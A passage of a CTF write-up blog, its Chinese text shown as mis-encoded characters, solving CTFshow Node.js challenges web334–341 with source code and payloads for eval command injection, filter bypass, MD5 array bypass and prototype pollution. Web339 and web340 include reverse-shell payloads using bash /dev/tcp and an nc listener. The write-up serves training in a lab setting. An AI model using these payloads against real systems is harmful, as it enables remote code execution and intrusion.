class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;è´¦å·æˆ–å¯†ç é”™è¯¯&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>user.js</strong></p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ç¯å¢ƒåå‘ç°æ˜¯ä¸ªç™»é™†ç•Œé¢ï¼Œå°è¯•<code>CTFSHOW/123456</code>ç™»å½•ï¼Œå‘ç°ç™»é™†å¤±è´¥ï¼Œä»”ç»†æŸ¥çœ‹ä»£ç ï¼Œå‘ç°å¯¹æˆ‘ä»¬çš„è¾“å…¥çš„ç”¨æˆ·åè¿›è¡Œå¤§å†™è½¬æ¢ï¼Œåœ¨åˆ¤æ–­æ˜¯å¦ç¬¦åˆæ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æˆ·åç”¨å°å†™</p><p><img src="/img/CTFSHOW-Nodejs/334.png" alt=""></p><h1 id="web335-å‘½ä»¤æ‰§è¡Œ"><a href="#web335-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web335(å‘½ä»¤æ‰§è¡Œ)"></a>web335(å‘½ä»¤æ‰§è¡Œ)</h1><p>æ‰“å¼€åä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œç›´æ¥çœ‹æºç ï¼Œå‘ç°æç¤ºï¼š</p><p><img src="/img/CTFSHOW-Nodejs/335.png" alt=""></p><p>çŒœæµ‹å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>æµ‹è¯•ï¼š<code>?eval=require(&quot;child_process&quot;).execSync(&#39;whoami&#39;)</code></p><p><img src="/img/CTFSHOW-Nodejs/335_01.png" alt=""></p><p>æˆåŠŸï¼è¯»å–flag</p><p><code>payload: ?eval=require(&quot;child_process&quot;).execSync(&#39;cat fl00g.txt&#39;)</code></p><h1 id="web336-è¿‡æ»¤"><a href="#web336-è¿‡æ»¤" class="headerlink" title="web336(è¿‡æ»¤)"></a>web336(è¿‡æ»¤)</h1><p>ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œé¡µé¢æ— æœ‰ç”¨ä¿¡æ¯ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºï¼Œå°è¯•ç”¨ä¸Šé“é¢˜çš„paylaod</p><p>è¿”å›é¡µé¢ï¼š</p><p><img src="/img/CTFSHOW-Nodejs/336.png" alt=""></p><p>çŒœæµ‹å¯èƒ½æœ‰è¿‡æ»¤ï¼Œå°è¯•åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹æ³•ï¼š</p><p><img src="/img/CTFSHOW-Nodejs/336_01.png" alt=""></p><p>æˆåŠŸï¼è¯»å–flag</p><p><code>payload: ?eval=require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat fl001g.txt&#39;)</code></p><h1 id="web337-md5ç»•è¿‡"><a href="#web337-md5ç»•è¿‡" class="headerlink" title="web337(md5ç»•è¿‡)"></a>web337(md5ç»•è¿‡)</h1><p>é¢˜ç›®ä¸Šæœ‰ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡</p><p><code>payload: ?a[x]=1&amp;b[x]=2</code></p><h1 id="web338-åŸå‹é“¾æ±¡æŸ“"><a href="#web338-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web338(åŸå‹é“¾æ±¡æŸ“)"></a>web338(åŸå‹é“¾æ±¡æŸ“)</h1><p>ç›´æ¥ç»™äº†æºç ï¼Œä¸è¦ç™½ä¸è¦ï¼Œæ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°å¯èƒ½æœ‰ç”¨çš„jsæ–‡ä»¶ï¼š<code>common.jsã€login.js</code></p><p><strong>common.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œè¿™æ˜¯ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œcopyå¾ˆåƒmerge</p><p>å¦‚æœ<code>secert.ctfshow===&#39;36dboy&#39;</code>é‚£å°±èƒ½å¾—åˆ°flag</p><p>secertç±»ä¸ºç©ºï¼Œç›´æ¥ç»§æ‰¿äº†Objectç±»ï¼Œuserä¹Ÿæ˜¯</p><p>æ‰€ä»¥secertç±»ä¸­æ²¡æœ‰ctfshowï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡useræ±¡æŸ“Objectç±»ï¼Œåœ¨Objectç±»é‡Œé¢åŠ ä¸€ä¸ªctfshow</p><p>åˆ¤æ–­<code>secert.ctfshow===&#39;36dboy&#39;</code>æ—¶ï¼Œæ‰¾ä¸åˆ°ctfshowï¼Œä¼šä»Objecté‡Œé¢æ‰¾ã€‚<br>æ„é€ payloadï¼š<code>&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</code></p><p>æ‰“å¼€ç¯å¢ƒï¼Œå‘ç°æ˜¯ä¸ªç™»é™†ç•Œé¢ï¼š</p><p><img src="/img/CTFSHOW-Nodejs/338.png" alt=""></p><p>é¡µé¢è¾“å…¥ä¸äº†ï¼Œåˆ©ç”¨bp</p><p>å°†æ•°æ®åŒ…çš„postæ•°æ®æ¢æˆæˆ‘ä»¬æ„é€ çš„æ•°æ®ï¼Œå‘åŒ…ï¼Œå¾—åˆ°flagï¼š</p><p><img src="/img/CTFSHOW-Nodejs/338_02.png" alt=""></p><h1 id="web339-åŸå‹é“¾æ±¡æŸ“"><a href="#web339-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web339(åŸå‹é“¾æ±¡æŸ“)"></a>web339(åŸå‹é“¾æ±¡æŸ“)</h1><p>æŸ¥çœ‹æºç ï¼š</p><p><strong>common.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>api.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨ Express æ¡†æ¶çš„è·¯ç”±æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨è¿™éƒ¨åˆ†ä»£ç ä¸­ï¼Œé¦–å…ˆå¼•å…¥äº† express æ¨¡å—ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªè·¯ç”±å¯¹è±¡ routerã€‚</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="comment">//å¼•å…¥äº†ä¸€ä¸ªåä¸º utilsï¼ˆvar utilsï¼‰ çš„è‡ªå®šä¹‰å·¥å…·æ¨¡å—ã€‚</span></span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line"><span class="comment">//é€šè¿‡ router.post() æ–¹æ³•å®šä¹‰äº†ä¸€ä¸ª POST è¯·æ±‚çš„å¤„ç†å‡½æ•°ï¼Œè·¯å¾„ä¸º &#x27;/&#x27;ã€‚</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">//é€šè¿‡ res.type(&#x27;html&#x27;) è®¾ç½®å“åº”çš„å†…å®¹ç±»å‹ä¸º HTMLã€‚</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">//ç„¶åï¼Œé€šè¿‡ res.render() æ–¹æ³•æ¸²æŸ“åä¸º &#x27;api&#x27; çš„è§†å›¾æ¨¡æ¿ï¼Œå¹¶ä¼ é€’ä¸€ä¸ªåŒ…å« query å±æ€§çš„å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚è¿™é‡Œä½¿ç”¨äº† Function(query) æ¥åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ç«‹å³è°ƒç”¨è¯¥å‡½æ•°å¹¶ä¼ é€’ query ä½œä¸ºå‚æ•°ã€‚è¿™æ ·åšå¯èƒ½æ˜¯ä¸ºäº†åœ¨è§†å›¾æ¨¡æ¿ä¸­ä½¿ç”¨ query å˜é‡ã€‚</span></span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);       <span class="comment">//å‡½æ•°åqueryï¼Œå‚æ•°query</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šè¿‡ module.exports å°† router å¯¹è±¡å¯¼å‡ºï¼Œä»¥ä¾¿åœ¨å…¶ä»–æ–‡ä»¶ä¸­å¼•å…¥å’Œä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">username</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">password</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalUser</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>ä¸ä¸Šé¢˜ä¸åŒçš„æ˜¯ï¼Œä¸Šä¸€é¢˜åˆ¤æ–­è¯­å¥æ˜¯<code>if(secert.ctfshow= = =â€˜36dboyâ€™)</code>ï¼Œè¿™é¢˜æ˜¯<code>if(secert.ctfshow= = =flag)</code>ï¼Œä½†æ˜¯å˜é‡flagçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ä¸Šä¸€é¢˜çš„payloadæ±¡æŸ“åŸå‹ä¿®æ”¹secert.ctfshow</p><p>é€šè¿‡ <code>login.js</code> é‡Œçš„ <code>utils.copy(user,req.body);</code> æ±¡æŸ“åŸå‹ï¼Œç„¶åè®¿é—® api çš„æ—¶å€™ç”±äº <code>query</code>æœªå®šä¹‰ï¼Œæ‰€ä»¥ä¼šå‘å…¶åŸå‹æ‰¾ï¼Œé‚£ä¹ˆé€šè¿‡æ±¡æŸ“åŸå‹æ„é€ æ¶æ„ä»£ç å³å¯rce</p><p>åŸå‹æ±¡æŸ“ä»¥å <code>login.js</code> å°±ä¸èƒ½æ­£å¸¸è¿è¡Œäº†ï¼Œæ‰€ä»¥payloadä½¿ç”¨åå¼¹shell</p><p>æ„é€ payloadï¼š</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></p><p>ç›‘å¬ç«¯å£ï¼š<code>nc -lvp port</code></p><p>å…ˆåœ¨<code>/login</code>é¡µé¢POSTä¸€ä¸‹è¿›è¡Œå˜é‡è¦†ç›–ï¼Œå†åœ¨<code>/api</code>ç•Œé¢ç›´æ¥POSTè®¿é—®å³å¯</p><p><img src="/img/CTFSHOW-Nodejs/339.png" alt=""></p><h1 id="web340-äºŒæ¬¡æ±¡æŸ“"><a href="#web340-äºŒæ¬¡æ±¡æŸ“" class="headerlink" title="web340(äºŒæ¬¡æ±¡æŸ“)"></a>web340(äºŒæ¬¡æ±¡æŸ“)</h1><p>çœ‹æºç </p><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>user.userinfo.isAdmin</code>åŸæœ¬å°±å­˜åœ¨ï¼Œä¸ä¼šå‘ä¸Šæ‰¾ï¼Œä¿®æ”¹<code>Object.isAdmin</code>æ— ç”¨ã€‚</p><p>ä¸Šä¸€é¢˜ä»secertå¯¹è±¡è¿›è¡Œæ±¡æŸ“ï¼Œsecertå¯¹è±¡ä¸Šä¸€çº§å°±æ˜¯objectï¼Œæ‰€ä»¥æ±¡æŸ“ä¸€æ¬¡å°±è¡Œäº†ã€‚</p><p>è¿™ä¸€é¢˜ä»userinfoå¯¹è±¡è¿›è¡Œæ±¡æŸ“ï¼Œuserinfoå¯¹è±¡ä¸Šä¸€çº§æ˜¯userå¯¹è±¡ï¼Œuserå¯¹è±¡ä¸Šä¸€çº§å°±æ˜¯objectï¼Œæ‰€ä»¥éœ€è¦æ±¡æŸ“ä¸¤æ¬¡ã€‚</p><p>payloadï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„æ“ä½œåŒä¸Šï¼Œåˆ©ç”¨è¿‡æ»¤å™¨æ‰¾åˆ°flagï¼š</p><p><img src="/img/CTFSHOW-Nodejs/340.png" alt=""></p><h1 id="web341-ejsæ¨¡æ¿å¼•æ“"><a href="#web341-ejsæ¨¡æ¿å¼•æ“" class="headerlink" title="web341(ejsæ¨¡æ¿å¼•æ“)"></a>web341(ejsæ¨¡æ¿å¼•æ“)</h1><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-ä»åŸå‹é“¾æ±¡æŸ“åˆ°rce/">Express+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE - evi0sâ€™ Blog</a></p><ul><li>åˆ©ç”¨ejs rceï¼ŒåŸç†æ˜¯ï¼š opts å¯¹è±¡ outputFunctionName æˆå‘˜åœ¨ express é…ç½®çš„æ—¶å€™å¹¶æ²¡æœ‰ç»™ä»–èµ‹å€¼ï¼Œé»˜è®¤ä¹Ÿæ˜¯æœªå®šä¹‰ï¼Œå³ undefined </li><li>ä½†æ˜¯åœ¨æœ‰åŸå‹é“¾æ±¡æŸ“çš„å‰æä¹‹ä¸‹ï¼Œå¯ä»¥æ§åˆ¶åŸºç±»çš„æˆå‘˜ï¼Œç»™ Object ç±»åˆ›å»ºä¸€ä¸ªæˆå‘˜ outputFunctionName ï¼Œè¿™æ ·å¯ä»¥è¿›å…¥ if è¯­å¥ï¼Œå¹¶å°†æˆ‘ä»¬æ§åˆ¶çš„æˆå‘˜ outputFunctionName èµ‹å€¼ä¸ºä¸€ä¸²æ¶æ„ä»£ç ï¼Œä»è€Œé€ æˆä»£ç 